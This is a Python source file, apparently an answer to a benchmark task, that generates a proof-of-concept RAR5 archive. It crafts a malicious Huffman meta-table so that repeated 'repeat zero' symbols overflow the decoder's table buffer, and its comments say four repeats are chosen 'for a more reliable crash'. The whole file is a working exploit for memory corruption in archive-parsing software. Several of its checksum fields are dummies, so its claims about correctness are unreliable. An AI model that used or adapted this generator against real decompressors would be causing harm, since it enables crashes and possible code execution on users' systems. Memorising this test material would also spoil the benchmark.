import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """

        class BitWriter:
            """
            A helper class to write bitstreams, as RAR5 reads LSB first from bytes.
            """
            def __init__(self):
                self.data = bytearray()
                self.accumulator = 0
                self.bit_count = 0

            def write(self, bits: int, num_bits: int):
                for _ in range(num_bits):
                    self.accumulator |= (bits & 1) << self.bit_count
                    self.bit_count += 1
                    if self.bit_count == 8:
                        self.data.append(self.accumulator)
                        self.accumulator = 0
                        self.bit_count = 0
                    bits >>= 1

            def flush(self) -> bytes:
                if self.bit_count > 0:
                    self.data.append(self.accumulator)
                return bytes(self.data)

        def write_varint(n: int) -> bytes:
            """
            Encodes an integer into the variable-length format used by RAR5.
            """
            res = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n == 0:
                    res.append(byte)
                    break
                res.append(byte | 0x80)
            return bytes(res)

        # --- PoC Constants ---
        SIGNATURE = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        # CRC32 of (size=7, type=5, flags=0) is pre-calculated
        END_HEADER = b'\xc4\x3d\x7b\x00\x07\x05\x00' 
        
        # --- Construct Packed Data (The Exploit Bitstream) ---
        # The vulnerability is in the Huffman table decoding. We craft a malicious
        # set of compressed tables.
        
        bw = BitWriter()

        # Packed block header bits
        bw.write(1, 1)  # Not the last block in the file
        bw.write(0, 1)  # Not byte-by-byte mode
        bw.write(0, 1)  # Not a large block

        # The Huffman tables are themselves compressed. First, a meta-table is read,
        # which is then used to decode the main tables (literals, distances).
        # We craft a meta-table where the code for symbol '18' is a single '0' bit.
        # Symbol '18' means "repeat zero N times", where N is read from the stream.
        
        # Write the bit lengths for the meta-table (20 entries, 4 bits each).
        # We set the bit length for symbol 18 to 1, and all others to 0.
        for i in range(20):
            bw.write(1 if i == 18 else 0, 4)

        # Now, write the data for the main table. The decoder will use our malicious
        # meta-table. We feed it a stream of '0's. Each '0' is decoded as symbol 18.
        # Symbol 18 then reads 7 bits for a repeat count, and generates (11 + count) zeros.
        # The buffer for the main tables is ~387 bytes.
        # Each repeat generates 11 + 127 = 138 zeros.
        # 3 repeats = 414 zeros, which overflows the buffer.
        # 4 repeats are used for a more reliable crash.
        num_repeats = 4
        for _ in range(num_repeats):
            bw.write(0, 1)    # The code for symbol 18 (a single '0' bit).
            bw.write(127, 7)  # The max repeat count (0b1111111).

        packed_data = bw.flush()

        # --- Construct File Header ---
        packed_size = len(packed_data)
        packed_size_varint = write_varint(packed_size)
        
        # The file header itself.
        header_body = bytearray()
        header_body += b'\x02'  # Header Type: File
        header_body += b'\x01'  # Header Flags: Data area is present
        header_body += packed_size_varint
        header_body += write_varint(0)  # Unpacked Size
        header_body += b'\x20'  # File Attributes: Archive
        header_body += b'\x00\x00\x00\x00'  # File Time (dummy)
        header_body += b'\x00\x00\x00\x00'  # File CRC32 (dummy)
        header_body += b'\x18'  # Compression Info: Method 3, 0 version
        header_body += b'\x02'  # Host OS: Unix
        header_body += write_varint(1)  # File Name Length
        header_body += b'a'  # File Name

        # The header size field is a varint of the body's length.
        header_size_varint = write_varint(len(header_body))

        file_header = b'\x00\x00\x00\x00' + header_size_varint + header_body

        # --- Assemble Final PoC ---
        poc = SIGNATURE + file_header + packed_data + END_HEADER
        
        return poc
